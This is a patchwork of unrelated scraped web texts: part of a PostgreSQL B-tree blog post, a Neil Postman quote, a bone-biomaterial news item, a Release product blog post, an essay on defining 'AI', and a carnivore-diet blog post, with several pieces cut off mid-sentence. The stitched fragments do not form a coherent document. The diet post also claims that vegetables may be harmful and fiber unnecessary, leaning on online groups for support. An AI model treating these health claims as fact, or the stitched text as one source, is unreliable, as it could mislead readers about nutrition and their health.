putting it aside for a while, and read in chunks that are convenient for you.
Some parts could be skipped as the text is build out of relatively independent
topics. The table of contents can help and guide you. Having said that we’re
ready to embark on the journey.</p>

<h2 id="1-introduction">1. Introduction</h2>
<p>Whenever we speak about indexes, especially in PostgreSQL context, there is a
lot to talk about: B-tree, Hash, GiST, SP-GiST, GIN, BRIN, RUM. But what if I
tell you that even the first item in this list alone hiding astonishing number
of interesting details and years of research? In this blog post I’ll try to
prove this statement, and we will be concerned mostly with B-tree as a data
structure.</p>
<p><img src="https://erthalion.info/public/img/btree-joke.png" width="80%"></p>

<p>Let’s start systematically and take a look at the definition first:</p>
<blockquote>
<p>B-tree is a self-balancing tree data structure that maintains sorted data and
allows searches, sequential access, insertions, and deletions in logarithmic
time.</p>
</blockquote>
<p>What is your first association with the concept of B-tree? Mine is “old and
well researched, or in other words boring”. And indeed apparently it was first
introduced in <a href="https://infolab.usc.edu/csci585/Spring2010/den_ar/indexing.pdf">1970</a>! Not only that, already in 1979 they
were <a href="http://cgi.di.uoa.gr/~ad/M149/ubiquitous_btree.pdf">ubiquitous</a>. Does it mean there is nothing exciting left any
more? Once upon a time I came across a remarkable read called
<a href="https://dl.acm.org/doi/10.1561/1900000028">Modern B-Tree techniques</a> which inspired me to dig
deeper into the topic and read bunch of shiny new whitepapers. Afterwards
totally by chance I’ve stumbled upon a book “Database Internals: A Deep Dive
into How Distributed Data Systems Work”, which contains great sections on
B-tree design. Both works were the triggers to write this blog post. What was I
saying about nothing exciting left? At the end I couldn’t be more wrong.</p>
<p>It turns out that there are multitude of interesting ideas and techniques
around B-Trees. They’re all coming from the desire to satisfy different (often
incompatible) needs, as well as adapt to emerging hardware. To demonstrate how
many of those exist, lets play a game. Below you can find a table of names I’ve
found in various science papers, together with a couple of silly names I’ve
come up myself. Can you find out the fake ones?</p>
<table>
<tbody>
<tr>
<td>B-tree</td>
<td>B<sup>+</sup>-tree</td>
<td>B<sub>link</sub>-tree</td>
<td>DPTree</td>

<tr>
<td>wB<sup>+</sup>-tree</td>

</tbody>
</table>

<p>Any ideas? Well, I have a confession to make – all of them are real, I just
don’t have enough imagination to come up with such names. Having this in mind
hopefully you understand that if we want to make a survey, the first step would
be to establish some classification. Not only this will help us to structure
the material, but also will explain why on earth anyone would need to invent so
many variations of what we though was so simple!</p>
<h2 id="2-rum-conjecture">2. RUM conjecture</h2>
<p>To classify different index access methods we need to think about the following
ambitious question – is there anything common between almost any index access
method? The authors of <a href="https://stratos.seas.harvard.edu/files/stratos/files/rum.pdf">RUM conjecture</a> provide an interesting
insight about this topic:</p>
<blockquote>
<p>The fundamental challenges that every researcher, systems architect, or
designer faces when designing a new access method are how to minimize, i)
read times, ii) update cost , and iii) memory (or storage) overhead.</p>
<p>In this paper, we conjecture that when optimizing the read-update-memory
overheads, optimizing in any two areas negatively impacts the third</p>
</blockquote>
<p>This essentially states that if an index access method could be specified as a
point inside “Read”, “Update” (on the Fig. 1 it’s called “Write” for
convenience of drawing), “Memory” space we can observe an interesting
invariant. Every time we modify one index access method to have less overhead
for reading or memory footprint (i.e. shift the corresponding point closer to
“Read”/”Memory” corners), we inevitably loose on the updating workload (i.e.
getting further away from “Write” corner).</p>
<figure>
<img src="https://erthalion.info/public/img/rum.png" width="50%">

</figcaption>
</figure>
<p>In fact as a non-scientist I would even speculate that there should be another
dimension called “Complexity”, but the idea is still clear. I will try to show
this invariant at work via examples in this blog post, but it already gives us
some ground under the feet and opportunity to visually represent different
versions of B-tree by moving point on the triangle back and forth. But first
let’s recall the basics.</p>
<h2 id="3-b-tree-basics">3. B-tree basics</h2>
<p>So what is B-tree? Well, it’s a tree data structure: a root node, some number
of branch nodes (marked grey) and a bunch of leaf nodes (marked green):</p>
<figure>
<img src="https://erthalion.info/public/img/btree.png" width="100%">
<br>
<figcaption>
Fig 2. B-tree nodes arrangement
</figcaption>
</figure>
<p>Every node of this tree is usually a page of some certain size and contains
keys (shaded slices of a node) and pointers to other nodes (empty slices with
arrows). Keys on page are kept in sorted order to facilitate fast search within
a page.</p>
<p>The original B-tree design assumed to have user data in all nodes,
branch and leaf. But nowadays the standard approach is a variation called
B<sup>+</sup>-tree, where user data is present only in leaf nodes and branch
nodes contains separator keys (pivot tuples in PostgreSQL terminology). In this
way separation between branch and leave nodes become more strict, allowing
better flexibility for choosing format of former and making deletion operations
can affect only latter. In fact the original B-tree design is barely worth
mentioning these days and I’m doing this just to be precise. Since
B<sup>+</sup>-tree is sort of default design, we’ll use B-tree and
B<sup>+</sup>-tree interchangeably in this text from now on. An interesting
thing to mention here is that the only requirements for separator keys is to
guide search algorithm to a correct leaf node. As long as they fulfil this
condition they can contain anything, no other requirements exist.</p>
<p>Strictly speaking, only child pointers are truly necessary in this design, but
quite often databases also maintain additional neighbour pointers, e.g. what you
can see on the Fig. 2 between the leaf nodes. It could be helpful for some
operations like index scan, but need to be taken into account for node
split/merge operations. PostgreSQL uses <a href="https://www.csd.uoc.gr/~hy460/pdf/p650-lehman.pdf">Lehman-Yao</a> version,
called B<sub>link</sub>-tree, with links to both left and right sibling nodes
(the left link one is actually not presented in the original
B<sub>link</sub>-tree design, and it makes backward scan somewhat interesting),
and there are even implementations like WiredTiger with
<a href="https://github.com/wiredtiger/wiredtiger/blob/f08bc4b18612ef95a39b12166abcccf207f91596/src/include/btmem.h#L550">parent pointers</a>.</p>
<p>Having all this in place one can perform a search query by following the path
marked red on the Fig. 2, first hitting the root, finding a proper separator
key, following a downlink and landing on a correct page where we deploy binary
search to find the resulting key.</p>
<p>Until now, we were talking only about static parts of B-tree design, but of
course there is more to it. For example there is one dynamic aspect of much
importance (quite often it even scares developers like a nightmare), namely
page splits. What do we need to do when there is a new value to insert, but the
target page does not have enough space like on the following diagram?</p>
<figure>
<img src="https://erthalion.info/public/img/page-split-1.png" width="60%">
<br>
<figcaption>
Fig 3. B-tree page split (a)
</figcaption>
</figure>
<p>What happens here is we’re trying to insert the new value (shaded box) into the
page with not enough space for it. To maintain the three balanced we need to
allocate another leaf page, distribute keys between old and new leaf, promote a
new separator key into the parent page and update all required links
(left/right siblings if present):</p>
<figure>
<img src="https://erthalion.info/public/img/page-split-2.png" width="60%">
<br>
<figcaption>
Fig 4. B-tree page split (b)
</figcaption>
</figure>
<p>Curiously enough the new separator key could be chosen freely, it could be any
value as long as it separates both pages. We can see what does it change in the
optimization section.</p>
<p>Locking is obviously an important part of a page split. No one wants to end up
with concurrency issues when pages get updated while in the middle of a split,
so a page to be split is write-locked as well as e.g. right sibling to update
left-link if present.</p>
<p>As you can see, page splits are introducing performance overhead. We need to
bring in a new page, move elements around and everything should be consistent
and correctly locked. And already at this pretty much basic point we already
can see some interesting trade-offs. For example B*-tree modification tries to
rebalance data between neighbouring nodes to postpone page split as long as
possible. In terms of trade-offs it looks like a balance between complexity and
insert overhead.</p>
<p>I didn’t tell you everything about B<sub>link</sub>-tree and it’s going to be our next
topic example in this section. Not only Lehman-Yao version adds a link to the
neighbour, it also introduces a “high key” to each page, which is an upper bound
on the keys that are allowed on page. While obviously introducing a bit memory
overhead those two changes make it possible to detect a concurrent page split
by checking the page high key, which allows the tree to be searched …</p></div></div>

Sometimes  that bias  is  greatly  to  our  advantage.  Sometimes  it  is  not.  The  printing  press  annihilated  the  oral  tradition; telegraphy  annihilated  space;  television  has  humiliated  the  word;  the  computer,  perhaps,  will  degrade community life.  And so on. <b>Fourth</b>, technological change  is not additive;  it is ecological,  which  means, it changes everything and is, therefore, too important to be left entirely in the hands of Bill Gates. And <b>fifth</b>, technology tends to become  mythic; that is, perceived as  part of the  natural  order of things, and therefore tends to control more of our lives than is good for us.&nbsp;</p><p>I will close  with this thought. <b>In the past,  we experienced technological change  in  the  manner  of  sleep-walkers</b>.  <b>Our  unspoken  slogan  has  been “technology  über  alles,” and  we have been willing to shape our lives to fit the requirements of technology, not the requirements of culture. This is a form of stupidity, especially in an age of vast technological change. We need to proceed with our eyes wide open so that we many use technology rather than be used by it."</b></p></blockquote><p><b>Presentation: <a href="https://prezi.com/p/egoxlf6-bln8/neil-postmans-five-ideas-to-technological-change/">Neil Postman's Five Ideas to Technological Change</a></b></p><p><b>"The Surrender of Culture to Technology" - talk by Neil Postman </b></p><div>

This explains, at least partially, why children’s bones are able to heal more quickly. Building on this knowledge, they created a biomaterial that mimics the structure of bone tissue and incorporates nanoparticles that activate JNK3.</p><p>When tested in a pre-clinical model, the biomaterial quickly repaired large bone defects and reduced inflammation after a month of use. The biomaterial also proved to be safer and as effective as other drug-loaded biomaterials for bone repair whose use has been controversially associated with dangerous side-effects, including cancer, infection or off-site bone formation.</p><p>“While more testing is needed before we can begin clinical trials, these results are very promising,” said Professor Fergal O’Brien, the study’s principal investigator and RCSI’s Director of Research and Innovation.</p><p>“This study has shown that understanding stem cell mechanobiology can help identify alternative therapeutic molecules for repairing large defects in bone, and potentially other body tissues. In a broader sense, this project is a great example of how growing our understanding of mechanobiology can identify new treatments that directly benefit patients – a key goal of what we do here at RCSI.”</p><p>The work was carried out by researchers from the Tissue Engineering Research Group (TERG) and SFI AMBER Centre based at RCSI in collaboration with a team from Children’s Health Ireland (CHI) at Temple Street Hospital. The CHI at Temple Street team was led by Mr Dylan Murray, a lead consultant craniofacial, plastic and reconstructive surgeon at the National Paediatric Craniofacial Centre (NPCC), who has collaborated with the RCSI team for a number of years.</p><p>“It is very exciting to be part of this translational project in which the participation and consent of the patients of the NPCC at Temple Street –whom donated harvested bone cells- have contributed immensely to this success,” said Mr Murray.</p><p>The research was funded by the Children’s Health Foundation Temple Street (RPAC-2013-06), Health Research Board of Ireland under the Health Research Awards - Patient-Oriented Research scheme (HRA-POR-2014-569), European Research Council (ERC) under Horizon 2020 (ReCaP project #788753) and Science Foundation Ireland (SFI) through the Advanced Materials and Bioengineering Research (AMBER) Centre (SFI/12/RC/2278).</p><p>“We have now proven that identifying mechanobiology-inspired therapeutic targets can be used to engineer smart biomaterials that recreate children’s superior healing capacity in adults’ stem cells,” said Dr Arlyng Gonzalez Vazquez, the study’s first author and a research fellow in TERG.</p><p>“We are using the same strategy to develop a novel biomaterial for cartilage repair in adults. A follow-up project recently funded by Children’s Health Foundation Temple Street is also aiming to utilise a similar scientific approach to identify if the molecular mechanisms found in children diagnosed with craniosynostosis (a condition where the skull fuses to early and in his brain growth) could be used to develop a therapeutic biomaterial that accelerates bone formation and bone healing in adults.”</p><p>This project contributed to Dr Arlyng Gonzalez Vazquez earning the highly prestigious “New Investigator Recognition Award” (NIRA) at the Orthopedic Research Society (ORS) Annual Meeting in 2019 in Austin, Texas.</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.rcsi.com%2Fdublin%2Fnews-and-events%2Fnews%2Fnews-article%2F2020%2F11%2Fresearchers-develop-new-biomaterial-that-helps-bones-heal-faster&amp;t=ZjA0NTFmZjAyMjRlZGEwMzhlM2NmN2JjNDQyMjI0ZDk2MjI1ZDI0MCxpd1RJTDdnUQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F636327484966715392%2Fnew-biomaterial-bone-healing&amp;m=0&amp;ts=1607113749">Royal College of Surgeons in Ireland (RCSI)</a></b></p><p>Full study:&nbsp;“Accelerating bone healing in vivo by harnessing the age-altered activation of c-Jun N-terminal kinase 3″, <i>Biomaterials</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1016%2Fj.biomaterials.2020.120540&amp;t=YzI4ZTBjNTQ2OWE5YjM3ODg3ZDgwZjQxMTkwZjBlNWRhNjVlZTM2NCxpd1RJTDdnUQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F636327484966715392%2Fnew-biomaterial-bone-healing&amp;m=0&amp;ts=1607113749">https://doi.org/10.1016/j.biomaterials.2020.120540</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/190085731082/heparin-bone-repair">Using heparin mixture to improve bone-repair procedures</a></p><p><a href="https://nuadox.com/post/622023157749071872/knee-cartilage-gel">The first cartilage-mimicking gel potentially strong enough for knees</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><h2 id="i-needwantlove-examples">I Need/Want/Love Examples</h2><p>I know that when I try out a new product, if it’s hard to see what it does quickly I usually move on. This is a shame because I’m sure there are products out there that I could have benefited from but it was just too difficult to get something up and running.</p><p>Release is the easiest way to create environments from any code change, Pull Request or the click of a button. We deploy your environments in a Kubernetes cluster that’s completely managed for you. <em>But in order to see how Release can change how you build software, you have to get your application running in Release.</em> Most of the time this is pretty straightforward, but there is definitely a setup curve to get over before you can see our product in full form. </p><p>The best technical products I’ve used always have a TON of great examples.  Stripe is definitely the king of this idea… we were just recently integrating their checkout feature into Release and <a href="https://github.com/stripe-samples" target="_blank" rel="noreferrer">their examples repo</a> is a model for how this can be done. It made our integration with Stripe so much easier than digging through docs to figure this all out.</p><p>I think examples are highly under-done, especially with highly technical products. I’m pretty sure I know why (especially after this project): it’s hard to spend the time and energy building out examples when you have features to build. But at Release, examples are a first class citizen and we believe will make getting up and running with Release easier.</p><h2 id="awesome-compose-is-awesome">awesome-compose is awesome</h2><p>As we started building and testing Release, we came across this fantastic repository, <a href="https://github.com/docker/awesome-compose" target="_blank" rel="noreferrer">https://github.com/docker/awesome-compose</a>, that has community created applications known to work with docker-compose. </p><p>Since Release can easily use a docker-compose file to create blueprints for environments, this was a perfect way for us to test out Release and make sure all the various ways docker-compose files are used are supported in the platform. Enter awesome-release</p><h2 id="awesome-release-is-awesome">awesome-release is awesome++</h2><p>We put together an <em>awesome</em> organization in Github with a ton of repositories that just work in Release that are derived from awesome-compose.</p><p><a href="https://github.com/awesome-release" title="Awesome examples running in Release" target="_blank" rel="noreferrer">https://github.com/awesome-release</a> is chock full of amazing projects that just work. The great part about all of these projects is that they show the range of how making simple applications to complex applications can be run and environments created within Release.</p><p>So if you’re getting started and need a project that will just work out of the box, I highly recommend forking or copying any of these repos and use it to create an app in Release. Every repository in <em>awesome-release</em> just works.</p><p>We’ve made modifications to some of the awesome-compose repos that needed slight tweaks. In each README we’ve described what we did to make the project work. Most of these things are minor adjustments that enable the project to run in a hosted Kubernetes environment vs being run locally via docker-compose.</p><p><a href="https://releaseapp.io/" target="_blank" rel="noreferrer">Click here to signup for Release and give it a shot!</a></p><p>Please let us know if there is an example you’d like to see and we’ll put it together for you. Just send us an email at <a href="mailto:support@releaseapp.io" target="_blank" rel="noreferrer">support@releaseapp.io</a> and we’ll add it to the list.</p><p><strong>Have fun and happy Releasing!</strong></p></div></article></div>]]>

      <h4>Popular usage of the term ‘Artificial Intelligence’ adds to misunderstanding of AI as it exists today.</h4>
      
      </div><div>
      <h2 id="the-options">The Options</h2>
<p>Definitions of the term ‘Artificial Intelligence’ tend to fit one of the following categories:</p>

<ol>
  <li>‘field of research’ definitions, e.g.: “a branch of computer science dealing with the simulation of intelligent behavior in computers” (<a href="https://www.merriam-webster.com/dictionary/artificial%20intelligence">Merriam-Webster</a>) , “the theory and development of computer systems able to perform tasks that normally require human intelligence” (Oxford)</li>
  <li>‘machine intelligence’ definitions, e.g.: “the capability of a machine to imitate intelligent human behavior “(<a href="https://www.merriam-webster.com/dictionary/artificial%20intelligence">Merriam-Webster</a>) , “intelligence demonstrated by machines, unlike the natural intelligence displayed by humans and animals.” (<a href="https://en.wikipedia.org/wiki/Artificial_intelligence">Wikipedia</a>) , “the ability of a digital computer or computer-controlled robot to perform tasks commonly associated with intelligent beings.” (<a href="https://www.britannica.com/technology/artificial-intelligence">Encyclopedia Brittanica</a>)</li>
  <li>‘intelligent entity’ definitions, e.g.: “a computer, robot, or other programmed mechanical device having [the] humanlike capacity [to perform operations and tasks analogous to learning and decision making in humans, as speech recognition or question answering]”. (<a href="https://www.dictionary.com/browse/artificial-intelligence">Dictionary.com</a>)</li>
</ol>

<p>While all of these options are similar in that they deal with ‘intelligent behavior’ in computers, they are also quite different. The first refers to a research discipline, while the second and third describe what that research discipline seeks to create. The ways in which the term ‘AI’ can be used depend on which of these definitions you consider valid. For instance, news articles often have titles to the effect of “Google’s new AI learned X” or “A new AI can do Y,” such as:</p>

<ul>
  <li><a href="https://www.theatlantic.com/technology/archive/2017/06/artificial-intelligence-develops-its-own-non-human-language/530436/">“An Artificial Intelligence Developed Its Own Non-Human Language”</a></li>
  <li><a href="https://www.fastcompany.com/90455358/ai-can-now-design-cities-should-we-let-it">“AI can now design cities, but should we let it?”</a></li>
  <li><a href="https://www.forbes.com/sites/danadovey/2020/02/11/first-time-ever-artificial-intelligence-develops-drug-candidate/">“For The First Time Ever, A Drug Developed By AI Will Be Tested In Human Trials”</a></li>
  <li><a href="https://www.sciencealert.com/google-s-ai-built-it-s-own-ai-that-outperforms-any-made-by-humans">“Google AI creates its own ‘child’ AI that’s more advanced than systems built by humans”</a></li>
</ul>

<p>But, such usage (“An AI Developed”, “AI can now”, etc.) is only valid with that third ‘intelligent entity’ definition. If the first ‘field of research’ definition is chosen instead, these titles would have to be rewritten as “Google’s new AI algorithm learned X” or “A new AI system can do Y.” In this piece, I’ll make the case that this definition and form of usage is superior to the alternatives, and should be adopted in most cases.</p>

<h2 id="why-should-we-care">Why Should We Care</h2>
<p>It may seem pedantic to say one of these definitions is better than any of the others, and tempting to just say all of them are fine. However, I argue that the ‘field of research’ definition of AI is better than the alternatives, primarily because of the <a href="https://www.aimyths.org/ai-has-agency">common misunderstanding</a> that AI programs today are independent agents with some amount of ‘free will’. In fact, what AI researchers and engineers build today are just computer programs, which are capable of emulating some aspects of human intelligence but are otherwise (for the most part) no more independent than the apps on our smartphones. Nevertheless, AI researchers recently ranked the idea that the AI algorithms they create have some human-like independence as the most common and problematic myth about AI; it was “number one by a long shot” <a href="https://www.skynettoday.com/podcast/top-ai-myths">according to a survey</a> asking which myths about AI are most common.</p>

<p>I believe part of why this myth is so predominant has to do with thinking of AI in terms of the ‘intelligent entity’ definition type and using the term accordingly by saying statements such as “A new AI can do Y”. Expanding that statement results in “A new Artificial Intelligence can do Y,” and the notion that the sentence refers to ‘An Intelligence’ inevitably implies agency similar to those of animals and humans. AI researcher Julian Togelius addresses this notion well in his blog post <a href="http://togelius.blogspot.com/2017/07/some-advice-for-journalists-writing.html">“Some advice for journalists writing about artificial intelligence”</a>:</p>

<blockquote>
  <p><strong>Keep in mind</strong>: There is no such thing as “an artificial intelligence”. AI is a collection of methods and ideas for building software that can do some of the things that humans can do with their brains. Researchers and developers develop new AI methods (and use existing AI methods) to build software (and sometimes also hardware) that can do something impressive, such as playing a game or drawing pictures of cats.</p>
</blockquote>

<p>AI researcher Zachary Lipton made this point more bluntly:</p>

<figure>
<blockquote><p lang="en" dir="ltr">Dear world (CC <a href="https://twitter.com/businessinsider?ref_src=twsrc%5Etfw">@businessinsider</a>,
<a href="https://twitter.com/Hamilbug?ref_src=twsrc%5Etfw">@Hamilbug</a>):
stop saying "an AI". AI's an aspirational term, not a
thing you build. What Amazon actually built is a "machine learning
system", or even more plainly "predictive model". Using
"an AI" grabs clicks but misleads <a href="https://t.co/0kdTLBsrHJ">https://t.co/0kdTLBsrHJ</a></p>—

11, 2018</a></blockquote> 
</figure>

<p>As someone who has tried to use my knowledge as an AI researcher to address popular misconceptions about AI, I have observed and continue to observe the usage of “An AI” often, and think it has the negative side effect of feeding misunderstanding of what AI is today. While it may be tempting to once again say this is being pedantic and that it’s fine to have a more ‘pop culture’ view of AI, with AI becoming increasingly embedded in our society it is more important than ever that all of us understand it. Such understanding is crucial so that we can collectively correctly focus on the most pressing issues with respect to AI (such as bias, automation, its use for surveillance, its safety) and not the issues that the agency myth implies (its potential to go rogue a la Skynet in the near term).</p>

<p>Therefore, given the existence of the ‘agency’ myth with respect to AI and the importance of correctly understanding what AI is actually like today, I would argue the first ‘field of research’ definition of the term ‘AI’ is better than the alternatives. As I’ll show next, this is (unsurprisingly) typically how AI researchers themselves use the term.</p>

<h2 id="how-researchers-define-ai">How Researchers Define AI</h2>

<p><a href="https://en.wikipedia.org/wiki/John_McCarthy_(computer_scientist)">John McCarthy</a>, one of the founders of the field of AI, defined AI as follows:</p>

<blockquote>
  <p>“It is the science and engineering of making intelligent machines, especially intelligent computer programs.”</p>
</blockquote>

<p>Professor <a href="https://nlp.stanford.edu/manning/">Christopher Manning</a><a href="https://hai.stanford.edu/sites/default/files/2020-09/AI-Definitions-HAI.pdf"> </a> <a href="https://hai.stanford.edu/sites/default/files/2020-09/AI-Definitions-HAI.pdf">recently cited</a> this as the definition of ‘Artificial Intelligence’ in his summary of definitions of terms related to AI. Similarly, in “Artificial Intelligence: A Modern Approach”, Stuart Russell and Peter Norvig defined AI as:</p>

<blockquote>
  <p>“the designing and building of intelligent agents that receive percepts from the environment and take actions that affect that environment.”</p>
</blockquote>

<p>To cite just one more example, in “The Quest for Artificial Intelligence: A History of Ideas and Achievements” <a href="https://en.wikipedia.org/wiki/Nils_John_Nilsson">Nils J. Nilsson</a> defines AI as follows:</p>

<blockquote>
  <p>“[the] activity devoted to making machines intelligent”</p>
</blockquote>

<p>There are of course many other definitions, but they tend to share the quality of considering AI a research or engineering discipline rather than a term that can be used to refer to singular algorithms or systems.</p>

<p>I conducted an informal survey to check whether AI researchers generally agree with this form of definition, with the following results:</p>

<figure>
<blockquote><div lang="en" dir="ltr"><p>AI Researchers: how do you define the term 'Artificial Intelligence'? </p><p>A: the science and engineering of making intelligent machines, especially intelligent computer programs</p><p>B: intelligence demonstrated by machines, unlike the natural intelligence of animals</p><p>C: Other</p></div>— Skynet Today (@skynet_today) <a href="https://twitter.com/skynet_today/status/1326239401912004611?ref_src=twsrc%5Etfw">November 10, 2020</a></blockquote>  
</figure>

<p>While hardly a careful study of what most AI researchers feel, the result of this poll agrees with my personal observations as an AI researcher that most in the field seem to prefer the John McCarthy definition of AI to the alternatives. I point this out because I think it further lends credence to the idea that the ‘field of research’ definition that does not allow for “An AI” as a phrase is superior to the alternatives. Granted, no one has any right to impose a particular way of defining terms on others, but I still think using the term ‘AI’ the same way the people actually working on AI in the real world (as opposed to science fiction, where ‘An AI’ is appropriate) makes a lot of sense.</p>

<h2 id="tldr">TLDR</h2>
<p>AI researchers tend to define ‘Artificial Intelligence’ to mean something along the lines of “the science and engineering of making intelligent machines, especially intelligent computer programs” – the ‘field of research’ definition. This is in contrast to definitions often used in popular media, which use ‘AI’ to refer to particular programs or systems with sentences – the ‘intelligent entity’ definition. The latter usage of AI reinforces an already common myth that present day AI has some amount of human-like agency, when in fact this is not really the case. Therefore, I believe that the ‘intelligent entity’ type definition should be avoided in favor of the ‘field of research’ definition, and the term should be used accordingly.</p>

Is meat bad for you?</h2><p>For most of us conscious eaters, these questions seem inconsequential and their answers obvious, easily confirmed by the growing trend of plant-based meat alternatives and the abundance of scientific data indicting meat for our health woes.</p><p>Athletes and celebrities like Kyrie Irving, Serena Williams, Joaquin Phoenix, and James Cameron proudly sport vegan lifestyles. Films like <em>What The Health</em>, <em>The Game Changers</em>, and many others praise the benefits of a plant-based diet. In most circles, the supremacy of plant foods is simply unquestioned. It has become an incontrovertible truth, one we've all known since as far back as we can remember, echoes of mom saying "finish your veggies" reverberating in our skulls.</p><p>But what if we were wrong?</p><p>What if you took the two banal questions at the top and flipped them on their heads:&nbsp;</p><p>Are vegetables <em>BAD</em> for you? Is meat <em>GOOD</em> for you?</p><p>These might be more interesting questions to explore. Asked in this way, instead of confirmation bias tending toward the already widely accepted convention of “plants good, meat bad,” we might try to prove or disprove the opposite.</p><p>I am by no means the first one to ask these questions. Apparently, I'm not even in a small minority here. When I first started looking into the carnivore diet, I was astonished at just how many people were experimenting with it and how much information was being shared around it. Even more, I was surprised that... a lot of it made sense.</p><p>The main thing that resonated with me was the biological perspective on the organisms we eat for nourishment. From middle school science class, I remember learning that every living organism has two basic imperatives: </p><ol start="" role="list"><li>survive, and</li><li>reproduce.</li></ol><p>If you apply this lens to the things we eat, you start to understand how some people might believe that vegetables can be bad for you, that plant foods, not meat, are to blame for the laundry list of our health problems, mostly by way of<a href="https://www.ncbi.nlm.nih.gov/books/NBK493173/"> chronic inflammation</a>.</p><p><em>(Indeed, "chronic inflammatory diseases are the most significant cause of death in the world.” They include stroke, chronic respiratory diseases, heart disorders, cancer, obesity, and diabetes. After the first wave of the COVID-19 pandemic in the US, the Centers for Disease Control and Prevention reported that 49 percent of people hospitalized for COVID-19 had preexisting hypertension, 48 percent were obese, and 28 percent had diabetes. All three are symptoms of chronic inflammation.)</em></p><p>For biological imperative number one, survival, an animal's tactics include speed, camouflage, claws, fangs, and occasionally poison. A plant, on the other hand, can't run away or physically fight back. Its first line of defense against being eaten is often a thick barrier, like bark or a cuticle, and possibly hard shells, thorns, or spines. If the exterior defense is breached, a plant's primary survival mechanism generally comes down to chemical warfare: toxins and enzymes that deter, harm, or even kill animals that ingest them.</p><p>Plant metabolites like alkaloids can produce noxious fumes or repugnant tastes, or cause excessive stimulation (caffeine) or lethargy (opioids). Other compounds like glycol cyanide, found in cassava roots, release cyanide upon ingestion. Still more deadly compounds produced by plants, like cardiac and steroidal glycosides, can cause nausea, vomiting, hallucinations, convulsions, or death if ingested.</p><p>Importantly, some plants approach survival as a long game, at the species level, with a focus on the second biological imperative: reproduction. They take the view that the best defense (survival) is a good offense (reproduction). A fruit- or nut-bearing plant, for example, offers tasty, high-energy snacks that attract mobile eaters, luring them into taking a bite. Being eaten is the goal here, at least in part, so that the eater may disperse the plant's seeds and produce life anew for its progeny. Seeds tend to be heavily protected, often coated in antinutrients like phytic acid or containing cyanogenic glycosides like amygdalin, to ensure they stay intact through the gastrointestinal tract or even get discarded.</p><p>Ultimately, it seems that a plant's survival is dependent on wholly or partially avoiding digestion. So what does that mean for us humans, who persistently prey on potentially pernicious plants? Perhaps, not much.</p><p>If you believe the hype, some high-performing athletes like<a href="https://en.wikipedia.org/wiki/Patrik_Baboumian"> Patrik Baboumian</a> stay at the top of their game by eating almost entirely plants. Yet again, other elite athletes like<a href="https://twitter.com/zbitter"> Zach Bitter</a> consume copious amounts of animal foods, while<a href="https://twitter.com/2min_keto"> some</a> go as far as eating<a href="https://twitter.com/SBakerMD"> only meat</a>.</p><p>So what's going on here?</p><p>To further examine the validity of this unconventional idea, and possibly the flaws in our conventional thinking, I committed to trying the carnivore diet for a month: 30 days, zero vegetables. Actually, no plants whatsoever. Fully aware of my bias favoring meat, I took on a carnivorous way of eating to collect some empirical data and examine three important questions:</p><ol start="" role="list"><li>Could meat be good for you?</li><li>Could vegetables be bad for you? More specifically to me: Could plant foods be to blame for my chronic pain?</li><li>Could meat be good for the environment?</li></ol><p>I planned the start of this experiment to coincide with <a href="https://www.edlinbetsthefarm.com/blog/why-i-left-san-francisco-tech-to-live-and-work-on-a-farm-part-1">my move from city life to a farm</a> called<a href="https://www.whiteoakpastures.com/?rfsn=4343802.7600d7"> White Oak Pastures</a>, where they practice regenerative agriculture and I could eat, very literally, farm to table. Because as much as the growing interest in carnivory is health motivated, I also believe the ecological impact of meat- and plant-eating is largely misunderstood and could use some good old N=1 analysis.</p><p>But first...</p><h2>What exactly is the carnivore diet?</h2><p>Put simply, the carnivore diet consists of only animal products, but there's a spectrum. My food intake consisted of meat, dairy, eggs, salt, and water. That's it. I didn’t eat anything that contained anything else. No sauces, dressings, etc. No teas or coffee. The ONLY exception I made was bacon. White Oak Pastures bacon is sugar-free but cured with kosher salt, red pepper flakes, black pepper, celery powder, and cherry powder.</p><p>If you want to be (even more) extreme about it, the true zealots eat only beef, salt, and water. Some call this the lion diet. Fun fact: the lion is my spirit animal, so I was tempted to go all out, but I thought having the option of cheese every so often would increase the likelihood that I'd actually make it a full month. And bacon. Hard to live without bacon.</p><p>Basically, the carnivore diet is the complete opposite of a plant-based diet. It means no plants whatsoever,<a href="https://faq.impossiblefoods.com/hc/en-us/articles/360019100553-What-is-soy-leghemoglobin-or-heme-"> Impossible Foods' imitation heme</a> be damned.</p><h2>Common concerns about an all-meat diet</h2><p>Given our pervasively conventional understanding of diet and health, the first few thoughts that jump to mind when considering a carnivore diet are: What about fiber, won't you get constipated? What about vitamin C, won't you get scurvy? And WHAT ABOUT FIBER? HOW WILL YOU POOP?!</p><p><strong>On vitamin C.</strong> As it turns out, there is vitamin C in beef liver and in eggs. Not as much as in an orange, but in the context of a carnivore diet, these sources provide sufficient levels of vitamin C to avoid scurvy and any real deficiency. According to the<a href="https://www.facebook.com/groups/worldcarnivoretribe/"> masses</a> in<a href="https://www.facebook.com/groups/carnivoreaureliusnation/?multi_permalinks=3512931485396546"> several</a> different<a href="https://www.facebook.com/groups/PrincipiaCarnivora/"> carnivore</a>-focused<a href="https://www.facebook.com/groups/donteatthatblog/"> communities</a>, as long as you're eating nose to tail, or at the very least supplementing beef liver, vitamin C deficiency is not a concern.</p><p><strong>On fiber.</strong> Poop, regularity, colon cancer, constipation! You might think a meat-heavy diet would require lots of fiber, but you would be wrong. The supposed importance of fiber in a healthy diet seems to be widely accepted, but it may very well be a<a href="https://pubmed.ncbi.nlm.nih.gov/1663443/"> consequence of modernization</a>. Effectively, fiber has been recommended for its supposed metabolic benefit, particularly as it relates to mitigating the adverse metabolic effects of a high-carbohydrate diet. The "benefit" is that fiber slows the digestion of food and hinders nutrient accessibility and absorption. But the context in which these effects are a benefit is that of an unhealthy diet. On a healthy diet, or more specifically here, on a diet low in carbohydrates, the effects of fiber are unnecessary.</p><p>After a moderate level of research, I felt safe to conclude that the alleged benefits of dietary fiber address problems spawned by the modern American diet in the first place, if they address any problems at all. It's more likely that dietary fiber is a soon to be anachronistic idea, its health claims part of an attempt to 